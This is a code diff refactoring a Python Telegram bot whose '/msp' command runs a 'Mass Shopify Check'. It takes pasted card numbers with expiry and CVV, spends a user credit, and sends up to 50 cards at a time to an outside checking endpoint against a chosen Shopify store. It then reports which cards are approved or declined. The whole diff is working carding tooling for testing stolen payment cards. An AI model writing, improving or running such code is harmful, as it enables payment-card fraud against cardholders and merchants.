@@ -3450,8 +3450,7 @@ CARD_REGEX = re.compile(r"\b\d{12,19}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3,4}\b")
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
-        new_credits = user_data["credits"] - 1
-        await update_user(user_id, credits=new_credits)
+        await update_user(user_id, credits=user_data["credits"] - 1)
         return True
     return False
 
@@ -3461,65 +3460,17 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
         url = f"{base_url}?site={site}&cc={card}"
         r = await session.get(url, timeout=20)
         data = r.json()
-
         resp = data.get("Response", "Unknown")
         status = data.get("Status", "false")
         price = data.get("Price", "0")
         gateway = data.get("Gateway", "N/A")
-
         return resp, status, price, gateway
     except Exception as e:
         return f"Error: {e}", "false", "0", "N/A"
 
-# /msp command
-async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    now = time.time()
-
-    # Cooldown 5s
-    if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
-        return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
-    last_msp_usage[user_id] = now
-
-    # Collect cards either from args or replied message
-    raw_input = None
-    if context.args:
-        raw_input = " ".join(context.args)
-    elif update.message.reply_to_message:
-        raw_input = update.message.reply_to_message.text
-
-    if not raw_input:
-        return await update.message.reply_text(
-            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\n"
-            "Or reply to a message containing cards.",
-            parse_mode="HTML"
-        )
-
-    cards = CARD_REGEX.findall(raw_input)
-    if not cards:
-        return await update.message.reply_text("❌ No valid cards found.")
-
-    if len(cards) > 50:
-        cards = cards[:50]
-
-    # DB fetch
-    user_data = await get_user(user_id)
-    if not user_data:
-        return await update.message.reply_text("❌ No user data found in DB.")
-
-    if not await consume_credit(user_id):
-        return await update.message.reply_text("❌ You have no credits left.")
-
-    base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
-    site = user_data.get("custom_url")
-    if not site:
-        return await update.message.reply_text("❌ No custom_url set in your account.")
-
-    msg = await update.message.reply_text("💳 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤…")
-
-async def run_check():
-    approved, declined, errors = 0, 0, 0
-    checked = 0
+# Core mass shopify check
+async def run_check(cards, base_url, site, msg):
+    approved = declined = errors = checked = 0
     site_price = None
     gateway_used = "Self Shopify"
     results = []
@@ -3532,18 +3483,15 @@ async def run_check():
             nonlocal approved, declined, errors, checked, site_price, gateway_used, results
 
             async with sem:
-                # Convert card tuple/list to string if needed
                 card_str = card if isinstance(card, str) else "|".join(card)
-
                 resp, status, price, gateway = await check_card(session, base_url, site, card_str)
 
-                # Convert resp safely to string
                 if isinstance(resp, (tuple, list)):
                     resp = " | ".join(map(str, resp))
                 else:
                     resp = str(resp)
 
-                # Get site price only once
+                # Site price (once)
                 if first and site_price is None:
                     try:
                         site_price = float(price)
@@ -3574,10 +3522,10 @@ async def run_check():
 
                 checked += 1
 
-                # Store result (response in italic)
+                # Individual card result (italic response)
                 results.append(f"{status_icon} {escape(card_str)}\n   ↳ <i>{escape(resp)}</i>")
 
-                # Progressive summary update
+                # Progressive summary (only code block for header)
                 summary_text = (
                     "<pre><code>"
                     f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
@@ -3600,12 +3548,50 @@ async def run_check():
                 except:
                     pass
 
-        # Run all workers concurrently
         await asyncio.gather(*(worker(c, first=(i == 0)) for i, c in enumerate(cards)))
 
-# Run in background
-asyncio.create_task(run_check())
+# /msp command handler
+async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    now = time.time()
 
+    # Cooldown 5s
+    if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
+        return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
+    last_msp_usage[user_id] = now
+
+    # Collect cards
+    raw_input = " ".join(context.args) if context.args else (update.message.reply_to_message.text if update.message.reply_to_message else None)
+    if not raw_input:
+        return await update.message.reply_text(
+            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\n"
+            "Or reply to a message containing cards.",
+            parse_mode="HTML"
+        )
+
+    cards = CARD_REGEX.findall(raw_input)
+    if not cards:
+        return await update.message.reply_text("❌ No valid cards found.")
+
+    if len(cards) > 50:
+        cards = cards[:50]
+
+    user_data = await get_user(user_id)
+    if not user_data:
+        return await update.message.reply_text("❌ No user data found in DB.")
+
+    if not await consume_credit(user_id):
+        return await update.message.reply_text("❌ You have no credits left.")
+
+    base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
+    site = user_data.get("custom_url")
+    if not site:
+        return await update.message.reply_text("❌ No custom_url set in your account.")
+
+    msg = await update.message.reply_text("💳 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤…")
+
+    # Run check in background
+    asyncio.create_task(run_check(cards, base_url, site, msg))
 
 
 
